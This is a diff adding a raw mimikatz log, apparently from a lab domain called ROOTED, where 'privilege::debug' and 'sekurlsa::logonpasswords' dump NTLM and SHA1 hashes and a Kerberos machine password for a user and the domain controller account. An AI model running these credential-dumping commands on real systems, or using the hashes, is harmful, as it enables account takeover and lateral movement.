@@ -1,0 +1,205 @@
+
+  .#####.   mimikatz 2.1.1 (x64) #17763 Dec  9 2018 23:56:50
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 200548 (00000000:00030f64)
+Session           : Interactive from 1
+User Name         : roman
+Domain            : ROOTED
+Logon Server      : DC
+Logon Time        : 07/03/2023 11:01:01
+SID               : S-1-5-21-4001629950-4265076451-4074222949-1104
+	msv :	
+	 [00000003] Primary
+	 * Username : roman
+	 * Domain   : ROOTED
+	 * NTLM     : 3e45171bc9c91d797d4c561b648ec753
+	 * SHA1     : 7f44ed15c922bc90fae5c4b45dc53e911e9042ad
+	 [00010000] CredentialKeys
+	 * NTLM     : 3e45171bc9c91d797d4c561b648ec753
+	 * SHA1     : 7f44ed15c922bc90fae5c4b45dc53e911e9042ad
+	tspkg :	
+	wdigest :	
+	 * Username : roman
+	 * Domain   : ROOTED
+	 * Password : (null)
+	kerberos :	
+	 * Username : roman
+	 * Domain   : ROOTED.LOCAL
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DC$
+Domain            : ROOTED
+Logon Server      : (null)
+Logon Time        : 07/03/2023 11:00:07
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : DC$
+	 * Domain   : ROOTED
+	 * NTLM     : 79f5cb310fe5696603e90c1a72fbb3c2
+	 * SHA1     : 68d4b76f8e308bd9f72de088ac3a284c1d997ab2
+	tspkg :	
+	wdigest :	
+	 * Username : DC$
+	 * Domain   : ROOTED
+	 * Password : (null)
+	kerberos :	
+	 * Username : dc$
+	 * Domain   : rooted.local
+	 * Password : 2d 99 4f d6 e1 a0 5f 04 99 99 e2 29 c4 d3 ca d4 c3 0d be 81 9b ba 3c 76 9d 1b 54 95 c6 05 a7 c0 d4 d1 1b d6 2e d8 57 22 fa 7b b2 e8 f0 05 45 15 04 35 c9 72 7b 71 78 95 b9 5b c5 55 0c 0a e0 05 87 07 48 2a 42 77 a6 ec 1a cb 01 85 82 3c ec 5d fe 31 13 25 eb f1 e7 cd 6e 13 cd 41 df 4b 07 b2 04 4b 2c eb f2 90 80 40 f6 bb d0 c6 f5 ec b7 8a 2f bb 91 99 c2 c7 99 5b 87 06 2a 48 fc ab 64 81 65 ed 26 f0 54 69 a9 6b c0 8a e0 68 ed c0 cb 72 9f 7c d1 1a fb 5c bf 33 7d 17 5f 9b b2 e6 2c 6f 64 f7 39 d8 fb 68 eb f8 e4 0a a8 c6 6a 19 12 f7 72 16 36 79 e1 98 5f 7f 1b f7 28 c0 fb fe 63 b7 90 91 4e 19 77 1e 42 f5 d5 c6 7c 20 8d fd 9f 82 e9 b6 2a fb ee c5 ae 83 e5 5a 20 94 0c 4f 24 90 ff 63 8a f5 ff 7a 79 b1 0e 25 21 da 9d 98 81 1d 
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : SERVICIO LOCAL
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 07/03/2023 11:00:07
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 48621 (00000000:0000bded)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 07/03/2023 11:00:07
+SID               : S-1-5-90-1
+	msv :	
+	 [00000003] Primary
+	 * Username : DC$
+	 * Domain   : ROOTED
+	 * NTLM     : 79f5cb310fe5696603e90c1a72fbb3c2
+	 * SHA1     : 68d4b76f8e308bd9f72de088ac3a284c1d997ab2
+	tspkg :	
+	wdigest :	
+	 * Username : DC$
+	 * Domain   : ROOTED
+	 * Password : (null)
+	kerberos :	
+	 * Username : DC$
+	 * Domain   : rooted.local
+	 * Password : 2d 99 4f d6 e1 a0 5f 04 99 99 e2 29 c4 d3 ca d4 c3 0d be 81 9b ba 3c 76 9d 1b 54 95 c6 05 a7 c0 d4 d1 1b d6 2e d8 57 22 fa 7b b2 e8 f0 05 45 15 04 35 c9 72 7b 71 78 95 b9 5b c5 55 0c 0a e0 05 87 07 48 2a 42 77 a6 ec 1a cb 01 85 82 3c ec 5d fe 31 13 25 eb f1 e7 cd 6e 13 cd 41 df 4b 07 b2 04 4b 2c eb f2 90 80 40 f6 bb d0 c6 f5 ec b7 8a 2f bb 91 99 c2 c7 99 5b 87 06 2a 48 fc ab 64 81 65 ed 26 f0 54 69 a9 6b c0 8a e0 68 ed c0 cb 72 9f 7c d1 1a fb 5c bf 33 7d 17 5f 9b b2 e6 2c 6f 64 f7 39 d8 fb 68 eb f8 e4 0a a8 c6 6a 19 12 f7 72 16 36 79 e1 98 5f 7f 1b f7 28 c0 fb fe 63 b7 90 91 4e 19 77 1e 42 f5 d5 c6 7c 20 8d fd 9f 82 e9 b6 2a fb ee c5 ae 83 e5 5a 20 94 0c 4f 24 90 ff 63 8a f5 ff 7a 79 b1 0e 25 21 da 9d 98 81 1d 
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 24317 (00000000:00005efd)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 07/03/2023 11:00:06
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : DC$
+	 * Domain   : ROOTED
+	 * NTLM     : 79f5cb310fe5696603e90c1a72fbb3c2
+	 * SHA1     : 68d4b76f8e308bd9f72de088ac3a284c1d997ab2
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 200511 (00000000:00030f3f)
+Session           : Interactive from 1
+User Name         : roman
+Domain            : ROOTED
+Logon Server      : DC
+Logon Time        : 07/03/2023 11:01:01
+SID               : S-1-5-21-4001629950-4265076451-4074222949-1104
+	msv :	
+	 [00000003] Primary
+	 * Username : roman
+	 * Domain   : ROOTED
+	 * NTLM     : 3e45171bc9c91d797d4c561b648ec753
+	 * SHA1     : 7f44ed15c922bc90fae5c4b45dc53e911e9042ad
+	 [00010000] CredentialKeys
+	 * NTLM     : 3e45171bc9c91d797d4c561b648ec753
+	 * SHA1     : 7f44ed15c922bc90fae5c4b45dc53e911e9042ad
+	tspkg :	
+	wdigest :	
+	 * Username : roman
+	 * Domain   : ROOTED
+	 * Password : (null)
+	kerberos :	
+	 * Username : roman
+	 * Domain   : ROOTED.LOCAL
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 48219 (00000000:0000bc5b)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 07/03/2023 11:00:07
+SID               : S-1-5-90-1
+	msv :	
+	 [00000003] Primary
+	 * Username : DC$
+	 * Domain   : ROOTED
+	 * NTLM     : 79f5cb310fe5696603e90c1a72fbb3c2
+	 * SHA1     : 68d4b76f8e308bd9f72de088ac3a284c1d997ab2
+	tspkg :	
+	wdigest :	
+	 * Username : DC$
+	 * Domain   : ROOTED
+	 * Password : (null)
+	kerberos :	
+	 * Username : DC$
+	 * Domain   : rooted.local
+	 * Password : 2d 99 4f d6 e1 a0 5f 04 99 99 e2 29 c4 d3 ca d4 c3 0d be 81 9b ba 3c 76 9d 1b 54 95 c6 05 a7 c0 d4 d1 1b d6 2e d8 57 22 fa 7b b2 e8 f0 05 45 15 04 35 c9 72 7b 71 78 95 b9 5b c5 55 0c 0a e0 05 87 07 48 2a 42 77 a6 ec 1a cb 01 85 82 3c ec 5d fe 31 13 25 eb f1 e7 cd 6e 13 cd 41 df 4b 07 b2 04 4b 2c eb f2 90 80 40 f6 bb d0 c6 f5 ec b7 8a 2f bb 91 99 c2 c7 99 5b 87 06 2a 48 fc ab 64 81 65 ed 26 f0 54 69 a9 6b c0 8a e0 68 ed c0 cb 72 9f 7c d1 1a fb 5c bf 33 7d 17 5f 9b b2 e6 2c 6f 64 f7 39 d8 fb 68 eb f8 e4 0a a8 c6 6a 19 12 f7 72 16 36 79 e1 98 5f 7f 1b f7 28 c0 fb fe 63 b7 90 91 4e 19 77 1e 42 f5 d5 c6 7c 20 8d fd 9f 82 e9 b6 2a fb ee c5 ae 83 e5 5a 20 94 0c 4f 24 90 ff 63 8a f5 ff 7a 79 b1 0e 25 21 da 9d 98 81 1d 
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DC$
+Domain            : ROOTED
+Logon Server      : (null)
+Logon Time        : 07/03/2023 11:00:06
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DC$
+	 * Domain   : ROOTED
+	 * Password : (null)
+	kerberos :	
+	 * Username : dc$
+	 * Domain   : ROOTED.LOCAL
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+mimikatz(commandline) # exit
+Bye!
